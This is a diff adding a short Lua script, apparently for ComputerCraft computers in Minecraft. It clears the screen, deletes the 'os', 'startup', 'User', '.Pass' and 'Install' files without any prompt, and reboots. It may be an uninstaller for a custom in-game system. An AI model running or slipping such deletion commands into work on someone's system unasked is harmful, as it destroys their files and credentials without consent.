@@ -1,0 +1,9 @@
+term.clear()
+term.setCursorPos(1,1)
+shell.run("delete","os")
+shell.run("delete","startup")
+shell.run("delete","User")
+shell.run("delete",".Pass")
+shell.run("delete","Install")
+os.reboot()
+
